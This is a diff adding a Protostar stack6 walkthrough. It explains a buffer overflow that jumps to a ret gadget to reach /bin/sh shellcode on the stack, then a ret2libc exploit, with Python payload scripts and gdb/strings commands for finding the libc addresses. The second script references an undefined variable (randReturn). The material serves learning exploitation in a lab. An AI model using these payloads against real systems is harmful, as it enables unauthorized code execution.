@@ -463,3 +463,83 @@ Then you will see that nothing shows up. This is because the shell wants some in
 So, now the cat takes input from the stdin and pipes it to the dash which then process it and prints it in the stdout.
 
 **Note that you might get segmentation fault or illegal instruction error. For that you have to play a bit with the eip value and the nopsled value.**
+
+### Level 7 (./stack6)
+
+In this level also we try to execute a shellcode. So, here also we can redirect our code to the stack and then put  the nopsled and then the shellcode. But, there is a small twist overhere. Before returning the function checks the return address and checks if it has **bf or ff or bb** in the front of return address by doing a simple and opration. But, the stack always start with these hex. So, how can we redirecdt the code to the stack if we can't put the address of stack in the return address.
+And let's do it with a twist. We know that the return command pops the esp and reidrects the eip to the address present one level below the poped esp. And moves the esp over there. So, that we do is that we overwrite the return address with the address of the return command of the function. And as the code is not present in the stack so it gets executed. And we then put the address of the stack just below the return address containing the address of the return command. And that's it our code gets redirected to the stack.
+So, the code would look like :
+
+```python
+import struct
+padding="A"*(80)
+#eip='\x10\xd7\xff\xff' #0xffffd710 #ffffd700
+ret=struct.pack("I", 0x080484f9)
+eip=struct.pack("I", 0xffffd704+80) #0xffffd74c
+nopsled="\x90"*100
+breakpoint="\xCC"*4
+shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
+print padding+ret+eip+nopsled+shellcode
+```
+
+It can be run just like the above challange and you will get the shell.
+
+#### Something's not right
+
+Ok we had successfully solved the previous two problems by redirecting the code to the stack and then executing our shellcode in the stack itself. But this is not right. This is locked in most of the platform. So, you can't run your code in stack and thus your exploit will fail. So, here comes the importance of **ret2lib**.
+So, libc is the standard library of C. And it has a intersting function called **"system"** just like the os.system in python. And that libc is present in proper memory and not in the stack so no frear of failing.
+So, as you were directiong the code to the stack, return command etc. you can redirect it to the address of the system command. But there is a small twist. The system command functions like this :
+
+```c
+#include<stdlib.h>
+void main(){
+        system("any bash command like ls, cd, /bin/sh or anything");
+}
+```
+
+That is simply we have to pass a parameter. So, now the question is that how the paramenter is passed.
+So, one extra step takes place when we call a function with parameter. The command or here the address of the command is pushed on the stack. Then as we know the return address is pushed and then the stack frame is formed. So, now you know how the structure of the stack will be. So, in short I can show the stucture of our payload as : **padding + system_addr + random_return_addr(let be "AAA") + command_addr(here addr of /bin/bash)**.
+So, now the address finding adventure start. The system address can be found very easily by just typing:
+
+```bash
+(gdb) x system
+```
+
+OR
+
+```bash
+(gdb) p system
+```
+
+System is name of a function so, gdb easily finds the address of system. Now let's find the address of /bin/sh in the libc function.
+So, put a break point at any point and then at that breakpoint run **info proc map** to get the address of all the process. So, there you will find the starting address of the libc or **/lib/i386-linux-gnu/libc-2.27.so**. So, now there is a **find** command in gdb to find any string in a address range. Run it like:
+
+```bash
+(gdb) find 0xf7dee000, +99999999, "/bin/sh"
+```
+
+THe +999... is just for a range i.e the ending address range.
+After runnning this you might get an address and by doing `x/s address_you_got` you might see output as "/bin/sh" and so that's youdesired address.
+This worked for me fine. But if this does'nt work for some reason there is another way around.
+Note the starting address of the libc from gdb. Now quit the gdb and in the terminal type :
+
+```bash
+strings -a -t x /lib/i386-linux-gnu/libc-2.27.so | grep "/bin/sh"
+```
+
+The "-t" tag denotes to show the offset of the string from the initial address. So, the output might look like : `17e0af /bin/sh`. And that's it you know the starting address, you know the offset. So, the final address is "starting + offset".
+So, now our journey of address discovery comes to an end.
+And finally the exploit looks like:
+
+```python
+import struct
+padding="A"*(80)
+sysAddr=struct.pack("I", 0xf7e2b2e0)
+randAddr="AAAA"
+bashAddr=struct.pack("I", 0xf7f6c0af)
+breakpoint="\xCC"*4
+print padding+sysAddr+randReturn+bashAddr
+```
+
+And run it with the cat trick and it will run fine.
+**The first benifit is as I told you is that if there is that locking in stack our exploit will not be affected. And the second benifit is that the guessing of the stack address is removed. Here we know solid addresses where we have to redirect our code.**
